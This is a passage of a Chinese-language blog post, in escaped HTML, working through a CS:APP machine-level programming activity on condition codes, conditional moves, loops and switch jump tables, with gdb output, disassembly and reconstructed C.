&lt;th&gt;&lt;code&gt;seta&lt;/code&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-1&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;-1&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;32768&lt;/td&gt;
&lt;td&gt;32767&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;32767&lt;/td&gt;
&lt;td&gt;32768&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;32768&lt;/td&gt;
&lt;td&gt;32768&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;32768&lt;/td&gt;
&lt;td&gt;−32768&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;−32768&lt;/td&gt;
&lt;td&gt;32768&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;−32768&lt;/td&gt;
&lt;td&gt;−32768&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;strong&gt;从 &lt;code&gt;-1&lt;/code&gt;  和 &lt;code&gt;0&lt;/code&gt;  的两行比较可以看得出来， &lt;code&gt;seta&lt;/code&gt;  是先将负数转化为 &lt;code&gt;unsigned&lt;/code&gt;  类型的数，然后再相减。当数字的值超过 &lt;code&gt;signed&lt;/code&gt;  类型范围后，会转化为负数，然后再比较。此处 &lt;code&gt;32768&lt;/code&gt;  在进行有符号数比较时都被转化为 &lt;code&gt;-32768&lt;/code&gt;  了&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;tests-and-conditional-move-instructions&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#tests-and-conditional-move-instructions&#34;&gt;#&lt;/a&gt; Tests and Conditional Move Instructions&lt;/h2&gt;
&lt;p&gt;输入下列指令开启当前 Activity:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ gdb ./test-cmov
(gdb) r
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得到如下提示：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) r
Starting program: /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/machine-control/test-cmov

This program should be run inside GDB:
  $ gdb /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/machine-control/test-cmov
  (gdb) r
If you didn&#39;t run it that way, it will now crash.
Otherwise, you will get the (gdb) prompt back.

Type &#39;c&#39; (short for &#39;continue&#39;) at the (gdb) prompt.

Program received signal SIGTRAP, Trace/breakpoint trap.
main (argc=&amp;lt;optimized out&amp;gt;, argv=&amp;lt;optimized out&amp;gt;) at machine-control/test-cmov.c:43
43      machine-control/test-cmov.c: No such file or directory.
(gdb)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;输入 &lt;code&gt;c&lt;/code&gt;  继续，得到如下提示：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) c
Continuing.

Besides &#39;main&#39;, this program defines three functions:
    &#39;cmove&#39;, &#39;cmovs&#39;, and &#39;cmovc&#39;.

Use the &#39;disassemble&#39; command on each to see their code.
Then, as instructed in the handout, use the &#39;call&#39; command
to call them with various arguments.

When you have answered all the questions in this section of
the handout, use the &#39;c&#39; command to go on.

Program received signal SIGTRAP, Trace/breakpoint trap.
main (argc=&amp;lt;optimized out&amp;gt;, argv=&amp;lt;optimized out&amp;gt;) at machine-control/test-cmov.c:45
45      in machine-control/test-cmov.c
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对 &lt;code&gt;cmove&lt;/code&gt; ， &lt;code&gt;cmovs&lt;/code&gt;  和 &lt;code&gt;cmovc&lt;/code&gt;  三个函数分别进行反汇编可以得到如下结果：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;(gdb) disassemble cmove
Dump of assembler code for function cmove:
   0x00000000004005b3 &amp;lt;+0&amp;gt;:     mov    $0x0,%eax
   0x00000000004005b8 &amp;lt;+5&amp;gt;:     test   %di,%di
   0x00000000004005bb &amp;lt;+8&amp;gt;:     cmove  %esi,%eax
   0x00000000004005be &amp;lt;+11&amp;gt;:    retq
End of assembler dump.
(gdb) disassemble cmovs
Dump of assembler code for function cmovs:
   0x00000000004005bf &amp;lt;+0&amp;gt;:     mov    $0x0,%eax
   0x00000000004005c4 &amp;lt;+5&amp;gt;:     test   %di,%di
   0x00000000004005c7 &amp;lt;+8&amp;gt;:     cmovs  %esi,%eax
   0x00000000004005ca &amp;lt;+11&amp;gt;:    retq
End of assembler dump.
(gdb) disassemble cmovc
Dump of assembler code for function cmovc:
   0x00000000004005cb &amp;lt;+0&amp;gt;:     mov    $0x0,%eax
   0x00000000004005d0 &amp;lt;+5&amp;gt;:     test   %di,%di
   0x00000000004005d3 &amp;lt;+8&amp;gt;:     cmovb  %esi,%eax
   0x00000000004005d6 &amp;lt;+11&amp;gt;:    retq
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;首先我们需要了解 &lt;code&gt;cmov&lt;/code&gt;  三条指令分别是做什么的，可以参见&lt;img data-src=&#34;mov.jpg&#34; alt=&#34;这张图&#34;&gt;&lt;/p&gt;
&lt;p&gt;其中 &lt;code&gt;cmove&lt;/code&gt;  是当 &lt;code&gt;ZF = 1&lt;/code&gt;  时为 1（相等或等于 0）， &lt;code&gt;cmovs&lt;/code&gt;  是当 &lt;code&gt;SF = 1&lt;/code&gt;  时为 1（为负数）， &lt;code&gt;cmovb&lt;/code&gt;  时当 &lt;code&gt;CF = 1&lt;/code&gt;  时为 1（低于，无符号 &lt;code&gt;&amp;lt;&lt;/code&gt; ）。上述三个函数的两个传入参数是 &lt;code&gt;%di&lt;/code&gt;  和 &lt;code&gt;%esi&lt;/code&gt; 。若 &lt;code&gt;%di&lt;/code&gt;  满足条件，则将返回值设置为 &lt;code&gt;%esi&lt;/code&gt; 。否则 &lt;code&gt;%eax = 0&lt;/code&gt; 。由此可得， &lt;code&gt;arg1&lt;/code&gt;  是 &lt;code&gt;%di&lt;/code&gt; , &lt;code&gt;arg2&lt;/code&gt;  是 &lt;code&gt;%esi&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;Q1: 为什么 &lt;code&gt;cmovc&lt;/code&gt;  中使用的是 &lt;code&gt;cmovb&lt;/code&gt;  指令？因为 &lt;code&gt;cmovc&lt;/code&gt;  指令的意义是 &lt;code&gt;move if carry&lt;/code&gt; &lt;br&gt;
Q2:  &lt;code&gt;test&lt;/code&gt;  指令使用的什么寄存器？使用的是 &lt;code&gt;%di&lt;/code&gt; ，2 个字节。&lt;/p&gt;
&lt;p&gt;接下来填表：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Arg 1( &lt;code&gt;%di&lt;/code&gt; )&lt;/th&gt;
&lt;th&gt;Arg 2( &lt;code&gt;%esi&lt;/code&gt; )&lt;/th&gt;
&lt;th&gt;cmove (相等 / 0)&lt;/th&gt;
&lt;th&gt;cmovs (负数)&lt;/th&gt;
&lt;th&gt;cmovb (无符号 &lt;code&gt;&amp;lt;&lt;/code&gt; )&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;−1&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;−1&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;−1&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;32767&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;32768&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;未填写部分全为 0。从上表我们可以看到 &lt;code&gt;cmove&lt;/code&gt;  只有在 &lt;code&gt;%di&lt;/code&gt;  等于 0 时，才会等于 &lt;code&gt;%esi&lt;/code&gt; 。而 &lt;code&gt;%esi&lt;/code&gt;  只有在为 &lt;code&gt;%di&lt;/code&gt;  负数时，才会等于 &lt;code&gt;%esi&lt;/code&gt; （此外，如果 &lt;code&gt;%di&lt;/code&gt;  的值超过了有符号数的上界，如 &lt;code&gt;32768&lt;/code&gt; ，那么其会被转化为 &lt;code&gt;-32768&lt;/code&gt; ，也就是最后一行，那么 &lt;code&gt;%di&lt;/code&gt;  也是负数，因此 &lt;code&gt;%eax&lt;/code&gt;  被赋值为 1）。此外， &lt;code&gt;cmovb&lt;/code&gt;  一直等于 0，因为这里没有无符号的小于。&lt;/p&gt;
&lt;h2 id=&#34;loops&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#loops&#34;&gt;#&lt;/a&gt; Loops&lt;/h2&gt;
&lt;p&gt;按照 handout 提示输入 &lt;code&gt;objdump -d loops.o&lt;/code&gt; ，得到如下结果：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;
loops.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 &amp;lt;forLoop&amp;gt;:
   0:   ba 00 00 00 00          mov    $0x0,%edx
   5:   b8 00 00 00 00          mov    $0x0,%eax
   a:   39 f0                   cmp    %esi,%eax
   c:   7d 0b                   jge    19 &amp;lt;forLoop+0x19&amp;gt;
   e:   48 63 c8                movslq %eax,%rcx
  11:   03 14 8f                add    (%rdi,%rcx,4),%edx
  14:   83 c0 01                add    $0x1,%eax
  17:   eb f1                   jmp    a &amp;lt;forLoop+0xa&amp;gt;
  19:   89 d0                   mov    %edx,%eax
  1b:   c3                      retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;该汇编代码的 C 语言形式如下：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;forLoop&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; x&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; len&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; ret &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; i &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; len&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; i&lt;span class=&#34;token operator&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      ret &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; x&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; ret&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;000000000000001c &amp;lt;whileLoop&amp;gt;:
  1c:   ba 00 00 00 00          mov    $0x0,%edx
  21:   b8 00 00 00 00          mov    $0x0,%eax
  26:   39 f0                   cmp    %esi,%eax
  28:   7d 0b                   jge    35 &amp;lt;whileLoop+0x19&amp;gt;
  2a:   48 63 c8                movslq %eax,%rcx
  2d:   03 14 8f                add    (%rdi,%rcx,4),%edx
  30:   83 c0 01                add    $0x1,%eax
  33:   eb f1                   jmp    26 &amp;lt;whileLoop+0xa&amp;gt;
  35:   89 d0                   mov    %edx,%eax
  37:   c3                      retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;该循环的 C 形式代码如下：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;whileLoop&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; x&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; len&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; ret &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; len&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      ret &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; x&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      i&lt;span class=&#34;token operator&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; ret&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;0000000000000038 &amp;lt;doWhileLoop&amp;gt;:
  38:   ba 00 00 00 00          mov    $0x0,%edx
  3d:   b8 00 00 00 00          mov    $0x0,%eax
  42:   48 63 c8                movslq %eax,%rcx
  45:   03 14 8f                add    (%rdi,%rcx,4),%edx
  48:   83 c0 01                add    $0x1,%eax
  4b:   39 f0                   cmp    %esi,%eax
  4d:   7c f3                   jl     42 &amp;lt;doWhileLoop+0xa&amp;gt;
  4f:   89 d0                   mov    %edx,%eax
  51:   c3                      retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;doWhileLoop&lt;/code&gt;  的 C 循环代码如下：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;doWhileLoop&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; x&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; len&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; ret &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; i &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token keyword&#34;&gt;do&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      ret &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; x&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      i&lt;span class=&#34;token operator&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; len&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; ret&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;switch-statements&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#switch-statements&#34;&gt;#&lt;/a&gt; Switch Statements&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;switch&lt;/code&gt;  语句汇编代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;switcher:
   cmpq $7 , %rdi
   ja .L2
   jmp *.L4(, %rdi , 8)
.L7:
   xorq $15 , %rsi
   movq %rsi , %rdx
.L3:
   leaq 112(% rdx), %rdi
   jmp .L6
.L5:
   leaq (%rdx , %rsi), %rdi
   salq $2 , %rdi
   jmp .L6
.L2:
   movq %rsi , %rdi
.L6:
   movq %rdi , (% rcx)
   ret
.section .rodata
.L4:
   .quad .L3 ;;x = 0 -&amp;gt; rdi = rdx + 112; break;
   .quad .L2 ;;x = 1 -&amp;gt; default
   .quad .L5 ;;x = 2 -&amp;gt; rdi = rdx + rsi; rdi = rdi &amp;lt;&amp;lt; 2; break;
   .quad .L2 ;;x = 3 -&amp;gt; default
   .quad .L6 ;;x = 4 -&amp;gt; *rcx = rdi; break;
   .quad .L7 ;;x = 5 -&amp;gt; rsi = rsi ^ 15; rdx = rsi;
   .quad .L2 ;;x = 6 -&amp;gt; default
   .quad .L5 ;;x = 7 -&amp;gt; rdi = rdx + rsi; rdi = rdi &amp;lt;&amp;lt; 2; break;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其还原的 C 语句代码如下：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 1, 3, 6 没有；只有 0，2，4，5，7&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// %rdi = a and val , %rsi = b, %rdx = c, %rcx = dest&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;switcher&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;long&lt;/span&gt; a&lt;span 